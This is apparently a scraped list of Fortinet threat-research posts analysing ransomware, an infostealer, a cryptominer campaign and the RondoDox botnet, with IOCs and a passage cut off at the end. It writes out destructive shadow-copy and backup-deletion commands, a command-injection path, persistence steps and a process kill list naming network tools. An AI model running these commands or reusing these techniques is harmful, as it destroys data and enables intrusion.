VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services. FortiGuard Antivirus detects and blocks the components of this campaign with the following signatures: These signatures cover malicious VBScript loaders, PowerShell-based XMRig miners, shell scripts used by Kinsing, Trojans, and stealers, as well as payloads that attempt to overwrite the MBR or beacon to Cobalt Strike infrastructure. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus engine. Customers with up-to-date protections are already secured against these threats. Lacework FortiCNAPPhelps identify misconfigured cloud environments and runtime threats. It detects unauthorized mining activity, lateral movement, and the deployment of tools like XMRig or Kinsing in containerized or VM-based workloads. FortiCNAPP also correlates risk across posture, identity, and behavior to help prioritize critical vulnerabilities before they are exploited. TheFortiGuard Content Disarm and Reconstruction (CDR)service, available on FortiGate and FortiMail, can remove embedded threats from weaponized scripts and files—especially those delivered through phishing or lateral propagation. URLs used in this campaign, including malware delivery servers and C2 infrastructure, are rated as“Malicious Websites”by theFortiGuard Web Filtering service, preventing users from inadvertently accessing harmful payloads or ransom note URLs. FortiGuard IPSprovides network-level detection for indicators of malicious activity associated with both the H2Miner and Lcrypt0rx campaigns. Using deep-packet inspection and updated threat rules, it blocks: These protections cut off active infection vectors by identifying suspicious command-and-control behaviors and known malicious patterns. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceblocks known malicious source IPs involved in mining operations, C2 activity, and dropper infrastructure. This service aggregates data from Fortinet’s global threat intelligence network, including FortiSandbox, honeypots, CERTs, and trusted partners. To help strengthen organizational resilience, Fortinet offers freesecurity awareness trainingthrough theNSE Training Institute: If you believe your organization has been impacted by Lcrypt0rx, H2Miner, or any related threats, please contactthe FortiGuard Incident Response Team To stay informed of new and emerging threats, sign up forFortiGuard Threat Intelligence alerts 78[.]153[.]140[.]6680[.]64[.]16[.]24189[.]208[.]104[.]17547[.]97[.]113[.]36176[.]65[.]137[.]203185[.]156[.]72[.]9680[.]64[.]18[.]161207[.]231[.]109[.]252104[.]21[.]32[.]1 Files ff1706b37fea16d75b739a5396d9ffba9e4f149dae1891f1d22a2cea4f68432ea729410de4dc397d1fb2ab8f7ae560d32726145d4ef3b34d3c3a566177805c391aee8a425ea53c571a16b8efde05ba01B6cd214bb814362694cc48299ebaf0e50680df49e1866c86697028ea73d28d28d3884cc519c6855ae20d64264d5f6e9357f0fdec4d919db0bd4576dc84aec75244143827116c96f5dcace4f95dff8697 1bf1efeadedf52c0ed50941b10a2f468a7bee104bb486ad0f10331233cc9a9f10dc2c71ce9c6c34668e9636abf61b1ae01e5b2530d4cba34f91c8090d19c92db Kinsing dbc9125192bd1994cbb764f577ba5ddab3039abf2ad5202f4a9363b418002351da753ebcfe793614129fc11890acedbcccef46c7edf9131ccffc47bd69eb743b 06a482a6096e8ff4499ae69a9c150e92f5f2b61b39105a2b1e6e1a5f4a3863ae9f764ec91535eaf03983b930d9f3bacd Wallet 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC89UoMhtsrpaJTvmJBbvy1cTdg38pomPFnW5Z4sniL2izcLQyGBkEGd96TcBJtzQUi6KAL5Ehe4cFpEMNdGF7tFKpJ1DqE8X89Arz88KTafhoTPAseYf2bfcWSjNq1YLaVY7ZkFaU21FivDueX4d7X7UErnyjAWHsVB1mibdTGHzqUTsS5FCMog89GVcQCh FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/old-miner-new-tricks'},\n",
              " {'title': 'How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques',\n",
              "  'content': \"FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated .NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\\\Windows\\\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense. FortiSandbox effectively detects and documents malicious behavior, showcasing its critical role in protecting against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Kryptik.SAC!tr.ransom The FortiGuard AntiVirus engine is part of the FortiGate, FortiMail, FortiClient, and FortiEDR solutions. Customers who have these products with up-to-date protections are protected. FortiGuard Sandbox servicedetects the ransomware file as High Risk in the Ransomware category. We also suggest that our readers go through the\\xa0freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. ae3dd3d1eedb6835e6746d51d9ab21c6 HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\DisableTaskMgr = 1 Vssadmin delete shadows /all /quietWmic shadowcopy deleteWbadmin delete catalog –quiet %APPDATA%\\\\svchost.exeRead_it.txt FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved\",\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques'},\n",
              " {'title': 'Catching Smarter Mice with Even Smarter Cats',\n",
              "  'content': 'FortiGuard Labs Threat Research How AI is Reshaping the Malware Arms Race From the beginning, the antivirus world has been acat-and-mousegame, where malware authors and antivirus engineers constantly adapt their code to bypass or catch each other.\\xa0Artificial Intelligence\\xa0is bringing the game to the next level, with malware authors using AI to improve their malware[1]\\xa0and anti-virus engineers using AI to assist them with reverse engineering[2]. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Nowadays,nearly all malware is packed and/or obfuscated. AI doesn’t help (yet) for packers: we tried this on a Linux/Prometei botnet sample from February 2025, and the AI would have wasted time reversing the inner logics of the packer if we hadn’t helped it out. To be fair,unpacking is a difficult task that current disassemblers like IDA Pro or Ghidra can’t do either.It’s something an AV analyst has to perform beforehand and then supply the unpacked binary for further analysis. As for obfuscation, the news is far better. While AI would probably fail and require human assistance for complicated obfuscation, it works reasonably well over standard obfuscation and junk code. This is a significant advancement for the antivirus industry. In the example below, the AI successfully analyzed the obfuscation algorithm of Linux/Ladvix.E and implemented a working de-obfuscator.[3] Another technique which has been trending in the malware scene for a few years is the use of specific frameworks (e.g, Flutter [4]) or high-level languages (Go, Rust). Currently, AI struggles with Flutter and Rust malware, which is not surprising because the field is still new. Human researchers struggle to find solutions, too! We tried AI-assistance over the “Flutter assembly” of Android/SpyLoan: it was totally helpless, didn’t map function names or strings, etc. However, when we proceed in a smarter way and produce the Blutter[5]output for the malware, thenAI is able to reconstruct very readable Dart code. AI is quite successful with the older Delphi language. We assume the reason is that LLMs were trained with Delphi and Pascal material. Despite being old, Delphi is still strangely used to implement Linux/Filecoder.BR!tr (aka Trigona) ransomware (sample from April 2025). For example, Ghidra meticulously decompiles the main function of the ransomware. We can immediately identify Delphi function names (e.g SYSTEM_RANDOM), followed by their types (LONGINT, LONGINT), and inner memory management functions (FPC_ANSISTR_DECR_REF). The former are interesting because they correspond to code that the malware author explicitly called. The latter are not interesting for malware analysis as they are inserted by the compiler (Free Pascal Compiler, in this case) to handle Ansi strings. When asked to decompile the same function,the AI smartly removes those inner calls and produces source code that is way easier to readthan what Ghidra gave. The anti-virus world has always been a cat-and-mouse game. While AI is close to defeating standard string and code obfuscation, malware authors are likely to adapt by using more complex obfuscation. Similarly, malware authors can harden reverse engineering by using recent frameworks and languages. So, where’s the progress, might you argue? The main difference is that, for once, the antivirus industry has a new tool that helps it more than the adversary. We areforcingmalware authors to use more complex obfuscation and newer frameworks and languages. Rust is more secure than C? Sure! Butthey have to make the effort to learn how to use Rust, use new libraries, cope with bugs, etc. And while they do that, our LLMs can update and train on those novelties even faster. Yes,it’s the first time in 20 years where time and tools are in our favor. Fortinet customers are already protected from all malware mentioned in this article through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Linux/Ladvix.E, Linux/Prometei.B, Adware/SpyLoan!Android, Linux/Filecoder.BR!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 943e1539d07eaffa4799661812c54bb67ea3f97c5609067688d70c87ab2f0ba4 – Linux/Ladvix.Ecc7ab872ed9c25d4346b4c58c5ef8ea48c2d7b256f20fe2f0912572208df5c1a – Linux/Prometei.Bc65298b6cd5a1769c747a0c7fb589ffa12fdf832b64787283953eaa57b65bc1c – Adware/SpyLoan!Androidc08a752138a6f0b332dfec981f20ec414ad367b7384389e0c59466b8e10655ec – Linux/Filecoder.BR!tr [1] https://www.hp.com/us-en/newsroom/press-releases/2024/ai-generate-malware.html [2]https://arxiv.org/html/2504.07574 [3]https://asciinema.org/a/724126Asciinema video of Linux/Ladvix deobfuscation [4]https://www.fortiguard.com/events/5552/virus-bulletin-2024-android-flutter-malware [5]https://github.com/worawit/blutter artificial intelligence FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/catching-smarter-mice-with-even-smarter-cats'},\n",
              " {'title': 'NordDragonScan: Quiet Data-Harvester on Windows',\n",
              "  'content': 'FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High FortiGuard Labs recently uncovered an active delivery site that hosts a weaponized HTA script and silently drops the infostealer “NordDragonScan”into victims’ environments. Once installed, NordDragonScan examines the host and copies documents, harvests entire Chrome and Firefox profiles, and takes screenshots. The package is then sent over TLS to its command-and-control server, “kpuszkiev.com,” which also serves as a heartbeat server to confirm the victim is still online and to request additional data when needed. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Attackers leverage shorter link services with “hxxps://cutt[.]ly/4rnmskDe” that redirects to “hxxps://secfileshare[.]com,” triggering the download of a RAR archive named “Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar” (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025). This file contains a malicious LNK shortcut that silently invokes mshta.exe to execute the hosted HTA payload “1.hta” from the same server. The malicious HTA file copies the legitimate PowerShell.exe binary to the path “C:\\\\Users\\\\Public\\\\Documents\\\\install.exe” to mask itself. It then downloads an encoded TXT file from a remote server, decodes it, and saves the result as “Act300525.doc.” This decoy document, titled “Акт здачі-приймання наданих Послуг до договору про надання послуг” (Act of Acceptance of Services under Service Agreement), is benign and intended to distract the user. Finally, the HTA script quietly drops and executes the actual malicious payload, embedded as a hardcoded executable named adblocker.exe, into the victim’s directory “\\\\AppData\\\\Local\\\\Temp\\\\adblocker.exe.” The attacker’s server maintains multiple decoy files designed to entice user interactions. These decoys employ a similar HTA script mechanism, which drops and executes the same payload, “adblocker.exe,” on compromised systems. The repeated use of the same executable across diverse decoys suggests a systematic approach by the threat actor to maximize infection opportunities while utilizing varied document themes and filenames to evade detection and security monitoring. The payload is a .NET executable containing an embedded PDB path: “C:\\\\Users\\\\NordDragon\\\\Documents\\\\visual studio.” NordDragonScan employs a custom string obfuscation routine, which performs an XOR operation and byte-swapping to conceal hard-coded strings from static analysis. It initially verifies if its dedicated working directory, “NordDragonScan,” exists in the “%LOCALAPPDATA%” folder. If this directory is absent, it creates it as a staging area to temporarily store stolen data before uploading it to the C2 server. It contacts the C2 server, ”kpuszkiev.com,” that contains specially crafted HTTP headers, specifically, “User-Agent: RTYUghjNM,” along with the victim machine’s MAC address. During its initial connection, the primary objective is to retrieve a dynamic URL from the C2, which it later leverages as an endpoint for exfiltrating stolen data. It then sets up persistence by adding a registry “NordStar” in “Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.” After the connection, NordDragonScan pivots to local reconnaissance. It retrieves the victim’s basic information, including computer name, username, OS version, architecture, processor count, driver information, and RAM using a combination of WMI (Win32_OperatingSystem, Win32_ComputerSystem) and .NET environment calls. The stealer then enumerates every active network adapter, extracts the primary IPv4 address and subnet mask, and calculates the full CIDR range. It then initiates lightweight probes to each address in the same subnet, building an inventory of reachable hosts on the same local area network (LAN). It also captures a screenshot and saves it as “SPicture.png” and collects data from the targeted Chrome and Firefox browsers. NordDragonScan next scans the local file system, includingDesktop,Documents, andDownloadsfolders, and copies the files in these folders with the following extensions: “.docx,” “.doc,” “.xls,” “.ovpn,” “.rdp,” “.txt,” and “.pdf.”Once it obtains a matched file, it copies it into the working directory and groups it according to the source from which it was obtained. When the scanning stage is complete, it initiates a POST to the C2 server. That request carries the custom header “User-Agent: Upload,” a second header, “Backups:,” and the name of the data it is about to send, such as “sysinfo.txt” for system information. NordDragonScan utilizes an effective distribution network for dissemination. The RAR file contains LNK calls that invoke mshta.exe to execute a malicious HTA script, displaying a decoy document in Ukrainian. Finally, it quietly installs its payload in the background. NordDragonScan is capable of scanning the host, capturing a screenshot, extracting documents and PDFs, and sniffing Chrome and Firefox profiles. Users should treat LNK shortcuts and untrusted compressed archives with extreme caution. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent.ALC!trVBS/Dropper.B!trMSIL/Agent.FFF!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. secfileshare[.]comkpuszkiev[.]com 2102c2178000f8c63d01fd9199400885d1449501337c4f9f51b7e444aa6fbf50e07b33b5560bbef2e4ae055a062fdf5b6a7e5b097283a77a0ec87edb7a3547253f3e367d673cac778f3f562d0792e4829a919766460ae948ab2594d922a0edae f8403e30dd495561dc0674a3b1aedaea5d6839808428069d98e30e19bd6dc045fbffe681c61f9bba4c7abcb6e8fe09ef4d28166a10bfeb73281f874d84f69b3d39c68962a6b0963b56085a0f1a2af25c7974a167b650cf99eb1acd433ecb772b9d1f587b1bd2cce1a14a1423a77eb746d126e1982a0a794f6b870a2d7178bd2c7b2b757e09fa36f817568787f9eae8ca732dd372853bf13ea50649dbb62f0c5b f4f6beea11f21a053d27d719dab711a482ba0e2e42d160cefdbdad7a958b93d0 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows'},\n",
              " {'title': 'RondoDox Unveiled: Breaking Down a New Botnet Threat',\n",
              "  'content': 'FortiGuard Labs Threat Research A new botnet built for evasion and disruption Affected Platforms:TBK DVR-4104. TBK DVR-4216. Four-Faith router models F3x24. Four-Faith router models F3x36.Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Over the past month, FortiGuard Labs has observed a significant increase in scanning activity, including a new botnet campaign that exploits two high-risk vulnerabilities:CVE-2024-3721andCVE-2024-12856. Both have been publicly disclosed and are actively being targeted, posing serious risks to device security and overall network integrity. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The botnet responsible for these attacks has been namedRondoDox. Unlike widespread variants such as Mirai or Gafgyt, RondoDox is a relatively new and low-profile threat. FortiGuard Labs first identified a similar ELF binary in September 2024. Notably, RondoDox incorporates custom libraries and mimics traffic from gaming platforms or VPN servers to evade detection. CVE-2024-3721is a critical vulnerability affecting TBK DVR models, including DVR-4104 and DVR-4216, as of April 12, 2024. The flaw stems from improper handling of the /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___ path, where the mdb and mdc parameters can be manipulated to inject OS commands. Successful exploitation allows remote attackers to execute arbitrary commands on affected devices. CVE-2024-12856impacts Four-Faith router models F3x24 and F3x36. The vulnerability allows authenticated remote attackers to execute arbitrary operating system commands via HTTP by exploiting the apply.cgi interface when modifying the system time. RondoDox was initially distributed to target Linux-based operating systems running on ARM and MIPS architectures. However, recent findings show the emergence of a shell script downloader that suggests the malware is now capable of targeting a broader range of Linux architectures, including Intel 80386, MC68000, MIPS R3000, PowerPC, SuperH, ARCompact, x86-64, and AArch64. The shell script begins by instructing the victim host to ignore several signals, including SIGTTOU, SIGTTIN, SIGTSTP, SIGHUP, SIGPIPE, SIGINT, SIGQUIT, and SIGTERM. It then checks for writable paths such as /dev, /dev/shm, the victim user’s home directory, /mnt, /run/user/0, /var/log, /var/run, /var/tmp, and /data/local/tmp, verifying if any are mounted without the noexec flag as listed in /proc/mounts. Finally, it creates a lib directory inside /tmp, downloads and executes the “RondoDox” malware, and clears the command execution history to evade detection. The following analysis focuses on the x86-64 architecture binary named rondo.x86_64. The RondoDox malware encodes its configuration data using a simple XOR obfuscation algorithm. This includes elements such as file paths and tool filenames. All encoded values can be decrypted using the hexadecimal key 0x21. After decoding its configuration data, RondoDox implements a persistence mechanism to maintain its presence on the victim host. RondoDox modifies file permissions and symbolic links to establish persistence. As shown in Figure 6, the XOR-encoded values byte_51D670 and byte_51D6C0 decode to /etc/init.d/rondo and /etc/rc3.d/S99rondo, respectively. Additionally, the malware embeds a shell script designed to execute its persistence routines on the victim system. In addition to using init scripts, RondoDox appends its launch command to several system startup files, including /etc/rcS, /etc/init.d/rcS, and /etc/inittab, as well as to both user and root crontab entries. This layered persistence strategy ensures that even if one method is removed or disabled, others remain active to automatically reinstate the botnet upon system reboot. Upon execution, RondoDox retrieves its own process ID and scans the system for specific applications. It looks for keywords associated with network utilities (such as wget and curl), system analysis tools (like Wireshark and gdb), or other malware (e.g., cryptominers or Redtail variants). If any such processes are detected, RondoDox immediately terminates them to evade analysis and maintain operational stealth. dhpcd apcid redtail xmrig miner ps top htop pstree lsof netstat ss wireshark tshark ngrep dumpcap tcpdump passwd chpasswd iptables nc netcat ufw gdb gdbserver cgdb strace valgrind stap dtrace sysdig bpftrace scp shutdown poweroff halt reboot During analysis of RondoDox, we noticed that the malware writes the email address vanillabotnet@protonmail[.]com to the file tmp/contact.txt. However, no further use of this address has been observed within the malware’s execution flow or command logic. Next, RondoDox scans several common Linux executable directories, including: It then renames selected executable files to hardcoded strings of random characters. This action is intended to disrupt critical system functions, including firewall configuration, user account management, and shutdown operations. By corrupting these binaries, the malware impairs system stability and complicates recovery efforts. Original File Name Modified File Name Iptables jsuJpf ufw nqqbsc passwd ahwdze chpasswd ereghx shutdown hhrqwk poweroff dcwkkb halt cjtzgw reboot gaajct After completing its setup routines, RondoDox decodes its command-and-control (C2) server address—83[.]150[.]218[.]93—using the key \"rondo\", and then initiates a connection to the server. The malware receives commands from its C2 server for subsequent DDoS attacks. RondoDox is capable of launching distributed denial-of-service (DDoS) attacks using three primary protocols: HTTP, UDP, and TCP. To evade detection, it disguises malicious traffic by emulating popular games and platforms such as Valve, Minecraft, Dark and Darker, Roblox, DayZ, Fortnite, GTA, as well as tools like Discord, OpenVPN, WireGuard, and RakNet. For example, when RondoDox receives a command from its C2 server to attack a specific target while impersonating OpenVPN traffic, it crafts packet payloads that include the OpenVPN \"magic byte,\" which begins with \\\\x38, as shown in Figure 17. Beyond gaming and chat protocols, RondoDox can also mimic custom traffic from tunneling and real-time communication services, including WireGuard, OpenVPN variants (e.g., openvpnauth, openvpncrypt, openvpntcp), STUN, DTLS, and RTC. By impersonating these legitimate services, the malware significantly increases the difficulty for defenders in effectively identifying and blocking its traffic. RondoDox is a sophisticated and emerging malware threat that employs advanced evasion techniques, including anti-analysis measures, XOR-encoded configuration data, custom-built libraries, and a robust persistence mechanism. These capabilities allow it to remain undetected and maintain long-term access on compromised systems. The malware primarily exploits two known vulnerabilities—CVE-2024-3721andCVE-2024-12856—highlighting the critical need for timely patching of affected systems. Its use of obfuscation, service mimicry, and multi-layered persistence underscores its growing threat potential. Ongoing monitoring, threat intelligence sharing, and in-depth behavioral analysis are crucial for comprehending the full extent of RondoDox and for developing effective detection and mitigation strategies. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/RondoDox.A!tr.dldrELF/RondoDox.CTO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerabilities: CVE-2024-3721: TBK.DVR.SOSTREAMAX.Command.InjectionCVE-2024-12856: Four-Faith.Routers.adj_time_year.Command.Injection We also suggest that organizations consider completingFortinet’s free trainingmodule,Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 45[.]135[.]194[.]3483[.]150[.]218[.]9314[.]103[.]145[.]20214[.]103[.]145[.]211154[.]91[.]254[.]9578[.]153[.]149[.]90 Downloader c88f60dbae08519f2f81bb8efa7e6016c6770e66e58d77ab6384069a515e451ceb3e2a6a50f029fc646e2c3483157ab112f4f017406c3aabedaae0c94e0969f6f4cd7ab04b1744babef19d147124bfc0e9e90d557408cc2d652d7192df61bda9 RondoDox e3c080e322862d065649c468d20f620c3670d841c30c3fe5385e37f4f10172e7e62df17150fcb7fea32ff459ef47cdd452a21269efe9252bde70377fd2717c1053e2c2d83813d1284ddb8c68b1572b17cca95cfc36a55a7517bf45ff40828be543d4847bf237c445ed2e846a106e1f55abefef5c3a8545bd5e4cad20f5deb9a44c2429fc8b8ec61da41cbba1b8184ec45fa93a9841b4ca48094bba7741b826b8694d729d67f1b0c06702490bfab1df3a96fe040fe5d07efa5c92356c329757beedae3b75deb8013bd48ac4534cca345b90938a2abb91672467c2bf9ae81ff6830814a0781ab30fca069a085dba201d6fd0f414498fafa4bb42859786d91d478159b4deee977e9e27b60e7e179d54a1ce8e56624e73b799523416eee828bfaf769f916a552efc6775367a31357a633dc0be01879830d3fddccdf3c40b26e50afd0a9ebbecc8ec58c253039520304ca373cfb8d1674d67993e6485e244a77d6ec96c81fd73b4bef6fef379cbefdcce7f374ea7e6bf1bf0917cf4ca7b72d4cee788a55a3859a203ca2bae7399295f92aeae61d845ffa173c1938f938f5c148eef9957573779f9a62eecb80737d41d42165af8bb9884579c50736766abb63d2835ba3daa53204978b7797bd53f5c964eed7a73d971517a764785ce3ab65a9423c2e78bf8928bc255e73e0b5b0ce13747c64d82d5f2647da129f189138773733ac21f20a24b179bdbbdcc0053838c0484ea25eff6976f2b8cb5630ab4efb28b0f06b542aa715573c7d2fca01914504cb7336db715d73d1e20d23e4bd37f2e4f4fe389c9278ce988343606350a94156ca28ee28bd605d1d95c810a16866eee1f997598a197f60d5f5641f2c56576b4c867d141612c6e00db29c512f266835510b8a62d8250d289c5ec87752cec1af31eed0347cf2dd54dc0fbeea645319c4dae238ee2d02414a54e97ad26748812002610f1491a2a746e9ba0f9d05de3d47d7bab4f5ec123a91fdacd9a4c0bcf800d6b7db5162cfd11cb71e260647ef0f2c60978ebfcef708fec1afbea4fb32b586e0dacf0d228c375a532008d81453c367256afea5a305507f34c14c72cab35715b7f7b25b32352a8e19b8a283003aaf539d12ca517937e6ab0dfcedfa23eced7b52d3899b0847df3fcb7a9c326b71027a7ab5f5b93 botnets,botnet FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved',\n",
              "  'link': 'https://www.fortinet.com/blog/threat-research/rondobox-unveiled-breaking-down-a-botnet-threat'},\n",
              " {'title': 'DCRAT Impersonating the Colombian Government',\n",
